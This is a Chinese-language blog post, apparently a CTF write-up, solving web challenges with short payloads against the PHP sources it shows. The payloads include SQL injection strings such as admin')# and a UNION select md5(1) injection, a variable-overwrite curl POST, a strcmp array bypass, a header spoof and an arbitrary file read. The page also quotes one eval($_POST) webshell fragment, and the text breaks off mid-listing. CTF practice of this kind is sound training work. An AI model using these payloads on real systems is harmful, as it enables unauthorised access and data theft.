<!DOCTYPE html>
<html lang="en-us">
  <head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noodp"/>
  <meta name="author" content="Gordon.Kwok">
  
  
  
  <link rel="prev" href="https://gordongwb.github.io/2020/cg-ctf-web-1/" />
  
  <link rel="canonical" href="https://gordongwb.github.io/2020/cg-ctf-web-2/" />
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  <title>
       
       
           CG CTF Web #2 | Gordon&#39;s Blog
       
  </title>
  <meta name="title" content="CG CTF Web #2 | Gordon&#39;s Blog">
    
  
  <link rel="stylesheet" href="/font/iconfont.css">
  <link rel="stylesheet" href="/css/main.min.css">


  
  
 

<script type="application/ld+json">
 "@context" : "http://schema.org",
    "@type" : "BlogPosting",
    "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https:\/\/gordongwb.github.io"
    },
    "articleSection" : "posts",
    "name" : "CG CTF Web #2",
    "headline" : "CG CTF Web #2",
    "description" : "0x00 变量覆盖 给出代码如下\n\x26lt;?php include(\x26#34;secret.php\x26#34;); if ($_SERVER[\x26#34;REQUEST_METHOD\x26#34;] == \x26#34;POST\x26#34;) { extract($_POST); if ($pass == $thepassword_123) { echo $theflag; } } ?\x26gt; 其中重要的是这一句 if ($pass == $thepassword_123) ，题目名叫变量覆盖，猜想需要传入这两个变量覆盖默认的变量。\n在本地终端运行 curl http:\/\/chinalover.sinaapp.com\/web18\/index.php -X POST -d \x26quot;pass=1\x26amp;thepassword_123=1\x26quot;\n成功取得 Flag\n0x01 PHP是世界上最好的语言 又是这个域名，访问不了啊啊啊\n0x02 伪装者 通过搜索发现可以在 header 中加入 X-Forwarded-For: 127.0.0.1 达到本地登陆的效果，但是无效，加入 client-ip: 127.0.0.1 后成功\n0x03 HEADER 又又又又又又挂了\n0x04 上传绕过 在网页元素中发现 upload.php 文件，内容为 Array ( ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件\n上传一张图片试试，提示 必须上传成后缀名为php的文件才行啊！\n做不来，各种姿势都尝试过了，以后再说。\n0x05 SQL注入1 给出源码\n\x26lt;?php if($_POST[user] \x26amp;\x26amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M .",
    "inLanguage" : "en-us",
    "author" : "Gordon.Kwok",
    "creator" : "Gordon.Kwok",
    "publisher": "Gordon.Kwok",
    "accountablePerson" : "Gordon.Kwok",
    "copyrightHolder" : "Gordon.Kwok",
    "copyrightYear" : "2020",
    "datePublished": "2020-02-07 22:35:36 \x2b0800 CST",
    "dateModified" : "2020-02-07 22:35:36 \x2b0800 CST",
    "url" : "https:\/\/gordongwb.github.io\/2020\/cg-ctf-web-2\/",
    "wordCount" : "936",
    "keywords" : [ "CTF","Web", "Gordon\x27s Blog"]
}
</script>

</head>

  


  <body class="">
    <div class="wrapper">
        <nav class="navbar">
    <div class="container">
        <div class="navbar-header header-logo">
        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://gordongwb.github.io">Gordon&#39;s Blog</a>
        </div>
        <div class="menu navbar-right">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/tags/" title="">Tags</a>
                
                <a class="menu-item" href="/about/" title="About My Blog">About My Blog</a>
                
        </div>
    </div>
</nav>
<nav class="navbar-mobile" id="nav-mobile" style="display: none">
     <div class="container">
        <div class="navbar-header">
            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://gordongwb.github.io">Gordon&#39;s Blog</a></div>
            <div class="menu-toggle">
                <span></span><span></span><span></span>
            </div>
        </div>
     
          <div class="menu" id="mobile-menu">
                
                
                <a class="menu-item" href="/posts/" title="">Blog</a>
                
                <a class="menu-item" href="/categories/" title="">Categories</a>
                
                <a class="menu-item" href="/tags/" title="">Tags</a>
                
                <a class="menu-item" href="/about/" title="About My Blog">About My Blog</a>
                
        </div>
    </div>
</nav>
    	 <main class="main">
          <div class="container">
      		
<article class="post-warp" itemscope itemtype="http://schema.org/Article">
    <header class="post-header">
        <h1 class="post-title" itemprop="name headline">CG CTF Web #2</h1>
        <div class="post-meta">
                Written by <a itemprop="name" href="https://gordongwb.github.io" rel="author">Gordon.Kwok</a> with ♥ 
                <span class="post-time">
                on <time datetime=2020-02-07 itemprop="datePublished">February 7, 2020</time>
                </span>
                in
                <i class="iconfont icon-folder"></i>
                <span class="post-category">
                        <a href="https://gordongwb.github.io/categories/penetration/"> Penetration </a>
                        
                </span>
        </div>
    </header>
    <div class="post-content">
        

        

        
        
     
          
          
          

          
          
          

          <h1 id="0x00-变量覆盖httpchinaloversinaappcomweb18indexphp">0x00 <a href="http://chinalover.sinaapp.com/web18/index.php">变量覆盖</a></h1>
<p>给出代码如下</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
<span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;secret.php&#34;</span>);
<span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>) { 
    <span style="color:#a6e22e">extract</span>($_POST);
    <span style="color:#66d9ef">if</span> ($pass <span style="color:#f92672">==</span> $thepassword_123) { 
        <span style="color:#66d9ef">echo</span> $theflag; 
    } 
} <span style="color:#75715e">?&gt;</span>
                
</code></pre></div><p>其中重要的是这一句 <code>if ($pass == $thepassword_123)</code> ，题目名叫变量覆盖，猜想需要传入这两个变量覆盖默认的变量。</p>
<p>在本地终端运行 <code>curl http://chinalover.sinaapp.com/web18/index.php -X POST -d &quot;pass=1&amp;thepassword_123=1&quot;</code></p>
<p>成功取得 Flag</p>
<h1 id="0x01-php是世界上最好的语言httpwaynuptzjcnphpindexphp">0x01 <a href="http://way.nuptzj.cn/php/index.php">PHP是世界上最好的语言</a></h1>
<p>又是这个域名，访问不了啊啊啊</p>
<h1 id="0x02-伪装者httpchinaloversinaappcomweb4xxxphp">0x02 <a href="http://chinalover.sinaapp.com/web4/xxx.php">伪装者</a></h1>
<p>通过搜索发现可以在 header 中加入 X-Forwarded-For: 127.0.0.1 达到本地登陆的效果，但是无效，加入 client-ip: 127.0.0.1 后成功</p>
<h1 id="0x03-headerhttpwaynuptzjcnweb5">0x03 <a href="http://way.nuptzj.cn/web5/">HEADER</a></h1>
<p>又又又又又又挂了</p>
<h1 id="0x04-上传绕过httpteamxlcsinaappcomweb521232f297a57a5a743894a0e4a801fc3indexhtml">0x04 <a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html">上传绕过</a></h1>
<p>在网页元素中发现 upload.php 文件，内容为 <code>Array ( ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件</code></p>
<p>上传一张图片试试，提示 <code>必须上传成后缀名为php的文件才行啊！</code></p>
<p>做不来，各种姿势都尝试过了，以后再说。</p>
<h1 id="0x05-sql注入1httpchinaloversinaappcomindexphp">0x05 <a href="http://chinalover.sinaapp.com/index.php">SQL注入1</a></h1>
<p>给出源码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
<span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">if</span>($_POST[<span style="color:#a6e22e">user</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#a6e22e">pass</span>]) {
    <span style="color:#a6e22e">mysql_connect</span>(<span style="color:#a6e22e">SAE_MYSQL_HOST_M</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">SAE_MYSQL_PORT</span>,<span style="color:#a6e22e">SAE_MYSQL_USER</span>,<span style="color:#a6e22e">SAE_MYSQL_PASS</span>);
    <span style="color:#a6e22e">mysql_select_db</span>(<span style="color:#a6e22e">SAE_MYSQL_DB</span>);
    $user <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>($_POST[<span style="color:#a6e22e">user</span>]);
    $pass <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">trim</span>($_POST[<span style="color:#a6e22e">pass</span>]));
    $sql<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;select user from ctf where (user=&#39;&#34;</span><span style="color:#f92672">.</span>$user<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;) and (pw=&#39;&#34;</span><span style="color:#f92672">.</span>$pass<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;)&#34;</span>;
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;/br&gt;&#39;</span><span style="color:#f92672">.</span>$sql;
    $query <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fetch_array</span>(<span style="color:#a6e22e">mysql_query</span>($sql));
    <span style="color:#66d9ef">if</span>($query[<span style="color:#a6e22e">user</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span>) {
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&#34;</span>;
    }
    <span style="color:#66d9ef">if</span>($query[<span style="color:#a6e22e">user</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;&lt;p&gt;You are not admin!&lt;/p&gt;&#34;</span>);
    }
}
<span style="color:#66d9ef">echo</span> $query[<span style="color:#a6e22e">user</span>];
<span style="color:#75715e">?&gt;</span> 
</code></pre></div><p>构造 <code>user=admin')#&amp;pass=1</code> 即可</p>
<h1 id="0x06-pass-checkhttpchinaloversinaappcomweb21">0x06 <a href="http://chinalover.sinaapp.com/web21/">pass check</a></h1>
<p>给出代码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$pass=@$_POST[&#39;pass&#39;];
$pass1=***********;//被隐藏起来的密码
if(isset($pass)){
    if(@!strcmp($pass,$pass1)){
        echo &#34;flag:nctf{*}&#34;;
    }else{
        echo &#34;the pass is wrong!&#34;;
    }
}else{
    echo &#34;please input pass!&#34;;
}
?&gt;
</code></pre></div><p>尝试变量覆盖失败,查找 strcmp 函数的绕过方法。</p>
<blockquote>
<p>Php5.3之后版本使用strcmp比较一个字符串和数组的话,将不再返回-1而是返回0</p>
</blockquote>
<p>构造 <code>curl http://chinalover.sinaapp.com/web21/ -X POST -d &quot;pass[]=1&quot;</code></p>
<p>得到 Flag。</p>
<h1 id="0x07-起名字真难httpchinaloversinaappcomweb12indexphp">0x07 <a href="http://chinalover.sinaapp.com/web12/index.php">起名字真难</a></h1>
<p>给出源码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">noother_says_correct</span>($number){
    $one <span style="color:#f92672">=</span> <span style="color:#a6e22e">ord</span>(<span style="color:#e6db74">&#39;1&#39;</span>);
    $nine <span style="color:#f92672">=</span> <span style="color:#a6e22e">ord</span>(<span style="color:#e6db74">&#39;9&#39;</span>);
    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($number); $i<span style="color:#f92672">++</span>)
    {   
        $digit <span style="color:#f92672">=</span> <span style="color:#a6e22e">ord</span>($number{$i});
        <span style="color:#66d9ef">if</span> ( ($digit <span style="color:#f92672">&gt;=</span> $one) <span style="color:#f92672">&amp;&amp;</span> ($digit <span style="color:#f92672">&lt;=</span> $nine) )
        {
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
        }
    }
    <span style="color:#66d9ef">return</span> $number <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;54975581388&#39;</span>;
}
$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;*******&#39;</span>;
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">noother_says_correct</span>($_GET[<span style="color:#e6db74">&#39;key&#39;</span>]))
   <span style="color:#66d9ef">echo</span> $flag;
<span style="color:#66d9ef">else</span> 
   <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;access denied&#39;</span>;
<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>key 不能为 1-9 的数字, 但是要求等于 &lsquo;54975581388&rsquo;</p>
<p>这个数字刚好是 0xccccccccc ,传入参数得到 key</p>
<h1 id="0x08-密码重置httpnctfnuptzjcnweb13indexphpuser1y3rmdxnlcg">0x08 <a href="http://nctf.nuptzj.cn/web13/index.php?user1=Y3RmdXNlcg==">密码重置</a></h1>
<p>一看网址就发现了 base64 编码的参数，解密后 是 ctfuser，即当前页面的默认用户名。我们需要重置 admin 的密码，那么网址的参数需要改为 admin 的 base64 编码 YWRtaW4= 。</p>
<p>然后发现表单中的用户名被设置成了 readonly ，按 F12 改为 admin 即可。</p>
<h1 id="0x09-sql-injectionhttpchinaloversinaappcomweb15indexphp">0x09 <a href="http://chinalover.sinaapp.com/web15/index.php">SQL Injection</a></h1>
<p>网页中注释源码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">#GOAL: login as admin,then get the flag;
error_reporting(0);
require &#39;db.inc.php&#39;;

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET[&#39;username&#39;]);
$password = @clean((string)$_GET[&#39;password&#39;]);

$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) &lt; <span style="color:#f92672">1</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">{</span>
	<span style="color:#a6e22e">die</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">Invalid</span> <span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">!</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">;</span>
<span style="color:#960050;background-color:#1e0010">}</span>

<span style="color:#a6e22e">echo</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">flag</span><span style="color:#960050;background-color:#1e0010">;</span>
</code></pre></div><blockquote>
<p>stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。</p>
<p>提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
<p>htmlentities()函数，它会把输入字符中的 ’ 或者 ” 转变为html实体,这样我们就不能闭合源码中的 ’ 了</p>
<p>简单的说，就是我们加的 \ 会被去掉，’ 或者 ” 会被转变。</p>
</blockquote>
<blockquote>
<ol>
<li>对于PHP magic_quotes_gpc=on的情况， 我们可以不对输入和输出数据库的字符串数据作addslashes()和stripslashes()的操作,数据也会正常显示。</li>
</ol>
<p>如果此时你对输入的数据作了addslashes()处理，那么在输出的时候就必须使用stripslashes()去掉多余的反斜杠。</p>
<ol start="2">
<li>
<p>对于PHP magic_quotes_gpc=off 的情况</p>
<p>必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出，因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行。</p>
</li>
</ol>
</blockquote>
<blockquote>
<p>这个特性在PHP5.3.0中已经废弃并且在5.4.0中已经移除了（This feature has been DEPRECATED as of PHP 5.3.0 and REMOVED as of PHP 5.4.0.）。所以没有理由再使用魔术引号，因为它不再是 PHP 支持的一部分。 不过它帮助了新手在不知不觉中写出了更好（更安全）的代码。 但是在处理代码的时候，最好是更改你的代码而不是依赖于魔术引号的开启。</p>
</blockquote>
<p>查询语句：
<code>SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';</code></p>
<p>整理后为<code>SELECT * FROM users WHERE name=' username ' AND pass=' password ';</code></p>
<p>构造 <code>?username=admin%20\&amp;password=%20or%201=1%23</code></p>
<p>使得后台执行的语句为 <code>SELECT * FROM users WHERE name=' admin \' AND pass=' or 1=1</code></p>
<h1 id="0x0a-综合题httpteamxlcsinaappcomweb3b0b0ad119f425408fc3d45253137d33dindexphp">0x0a <a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php">综合题</a></h1>
<p>jsfuck 编码，在 FireFox 的控制台里竟然没有办法直接运行！？还报了一行警告： Scam Warning: Take care when pasting things you don’t understand. This could allow attackers to steal your identity or take control of your computer. Please type ‘allow pasting’ below (no need to press enter) to allow pasting. 我觉得有道理，就放在 Chrome 的控制台里执行了。</p>
<p>结果： <code>1bc29b36f623ba82aaf6724fd3b16718.php</code></p>
<p>访问得到提示： <code>哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里</code></p>
<p>说明在响应头里，得到提示 <code>tip: history of bash</code></p>
<p>bash 的历史记录储存在 .bash_history 文件里面，尝试访问。得到 <code>zip -r flagbak.zip ./*</code> ,一个打包的命令，下载该文件并解压，得到 Flag</p>
<h1 id="0x0b-sql注入2http4chinaloversinaappcomweb6indexphp">0x0b <a href="http://4.chinalover.sinaapp.com/web6/index.php">SQL注入2</a></h1>
<p>题目说主要考察 UNION 查询，给出了源代码</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
<span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">if</span>($_POST[<span style="color:#a6e22e">user</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#a6e22e">pass</span>]) {
   <span style="color:#a6e22e">mysql_connect</span>(<span style="color:#a6e22e">SAE_MYSQL_HOST_M</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">SAE_MYSQL_PORT</span>,<span style="color:#a6e22e">SAE_MYSQL_USER</span>,<span style="color:#a6e22e">SAE_MYSQL_PASS</span>);
  <span style="color:#a6e22e">mysql_select_db</span>(<span style="color:#a6e22e">SAE_MYSQL_DB</span>);
  $user <span style="color:#f92672">=</span> $_POST[<span style="color:#a6e22e">user</span>];
  $pass <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#a6e22e">pass</span>]);
  $query <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysql_fetch_array</span>(<span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;select pw from ctf where user=&#39;</span><span style="color:#e6db74">$user</span><span style="color:#e6db74">&#39;&#34;</span>));
  <span style="color:#66d9ef">if</span> (($query[<span style="color:#a6e22e">pw</span>]) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcasecmp</span>($pass, $query[<span style="color:#a6e22e">pw</span>]))) {
      <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&#34;</span>;
  }
  <span style="color:#66d9ef">else</span> {
    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;&lt;p&gt;Log in failure!&lt;/p&gt;&#34;</span>);
  }
}
<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>查询语句 <code>select pw from ctf where user='$user'</code> ，将 pass 进行 MD5 加密后与选到的密码进行对比。</p>
<p>构造 <code>user=%27union select md5(1)%23&amp;pass=1</code> 即可</p>
<h1 id="0x0c-综合题2httpcmsnuptzjcn">0x0c <a href="http://cms.nuptzj.cn/">综合题2</a></h1>
<h2 id="一个很有意思的网站先收集一下信息">一个很有意思的网站，先收集一下信息。</h2>
<ul>
<li>index.php 主页文件</li>
<li>about.php 可以查看其他文件</li>
<li>sm.txt  CMS的说明文档</li>
<li>config.php 数据库信息</li>
<li>passencode.php 加密算法</li>
<li>say.php 用于接受和处理用户留言请求</li>
<li>so.php 搜索</li>
<li>preview.php 预览</li>
</ul>
<p>admin表结构 create table admin ( id integer, username text, userpass text, )</p>
<p>已知页面的参数</p>
<ul>
<li>about.php?file=<!-- raw HTML omitted -->
可以传一个 file 参数</li>
<li>index.php?page=1
在第二页发现内容 <code>&lt;?php eval($_POST['1:123',1)#</code></li>
<li>say.php
say.php?nice=&amp;usersay=&amp;Submit=确认提交</li>
</ul>
<h2 id="尝试通过-aboutphp-获取其他文件内容">尝试通过 about.php 获取其他文件内容。</h2>
<ol>
<li>
<p>index.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_COOKIE[<span style="color:#e6db74">&#39;username&#39;</span>])){ <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;username&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>); <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;userpass&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>); } <span style="color:#75715e">?&gt;</span> 
<span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//这里输出用户留言 
</span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;antixss.php&#39;</span>; 
<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;config.php&#39;</span>; 
$con <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>($db_address,$db_user,$db_pass) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;不能连接到数据库！！&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mysql_error</span>()); 
<span style="color:#a6e22e">mysql_select_db</span>($db_name,$con); 
$page<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>]; 
<span style="color:#66d9ef">if</span>($page<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">||</span> $page<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>){ $page<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>; } 
$page<span style="color:#f92672">=</span><span style="color:#a6e22e">intval</span>($page); 
$start<span style="color:#f92672">=</span>($page<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>; 
$last<span style="color:#f92672">=</span>$page<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>; 
$result<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SELECT * FROM `message` WHERE display=1 ORDER BY id LIMIT </span><span style="color:#e6db74">$start</span><span style="color:#e6db74">,</span><span style="color:#e6db74">$last</span><span style="color:#e6db74">&#34;</span>); 
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">mysql_num_rows</span>($result)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){ 
    <span style="color:#66d9ef">while</span>($rs<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_fetch_array</span>($result)){ 
        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">htmlspecialchars</span>($rs[<span style="color:#e6db74">&#39;nice&#39;</span>],<span style="color:#a6e22e">ENT_QUOTES</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;:&lt;br /&gt;&#34;</span>; 
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">antixss</span>($rs[<span style="color:#e6db74">&#39;say&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br /&gt;&lt;hr /&gt;&#39;</span>; 
    } 
} 
<span style="color:#a6e22e">mysql_free_result</span>($result); <span style="color:#75715e">?&gt;</span> 
<span style="color:#75715e">&lt;?php</span> 
$contents<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SELECT * FROM `message` WHERE display=1&#34;</span>); 
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">mysql_num_rows</span>($contents)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){ 
    $num<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_num_rows</span>($contents); 
    <span style="color:#66d9ef">if</span>($num<span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>){ $pagenum<span style="color:#f92672">=</span><span style="color:#a6e22e">intval</span>($num<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>; 
    }
    <span style="color:#66d9ef">else</span>{ 
        $pagenum<span style="color:#f92672">=</span><span style="color:#a6e22e">intval</span>($num<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>); 
    } 
    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;$i<span style="color:#f92672">&lt;=</span>$pagenum;$i<span style="color:#f92672">++</span>){ 
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;index.php?page=&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">htmlspecialchars</span>($i)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#34;&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">htmlspecialchars</span>($i)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/a&gt;&amp;nbsp;&#39;</span>; 
    } 
} 
<span style="color:#a6e22e">mysql_free_result</span>($contents); 
<span style="color:#a6e22e">mysql_close</span>($con); 
<span style="color:#75715e">?&gt;</span> 
</code></pre></div><p>在文件前看到 setcookie 函数，查看响应头发现格式如下。
username=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
userpass=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT</p>
</li>
<li>
<p>about.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
$file<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;file&#39;</span>]; 
<span style="color:#66d9ef">if</span>($file<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strstr</span>($file,<span style="color:#e6db74">&#39;config.php&#39;</span>)){ 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;file参数不能为空！&#34;</span>; 
    <span style="color:#66d9ef">exit</span>(); 
}
<span style="color:#66d9ef">else</span>{ 
    $cut<span style="color:#f92672">=</span><span style="color:#a6e22e">strchr</span>($file,<span style="color:#e6db74">&#34;loginxlcteam&#34;</span>); 
    <span style="color:#66d9ef">if</span>($cut<span style="color:#f92672">==</span><span style="color:#66d9ef">false</span>){ 
        <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>($file); 
        $date<span style="color:#f92672">=</span><span style="color:#a6e22e">htmlspecialchars</span>($data); 
        <span style="color:#66d9ef">echo</span> $date; 
    }
    <span style="color:#66d9ef">else</span>{ 
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;/script&gt;&#34;</span>; 
    } 
}
</code></pre></div></li>
<li>
<p>so.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#75715e">&lt;?php</span> 
 <span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>]<span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;Xlcteam Browser&#34;</span>){ 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~&#39;</span>; 
    <span style="color:#66d9ef">exit</span>(); 
 } 
 $id<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;soid&#39;</span>]; 
 <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;config.php&#39;</span>; 
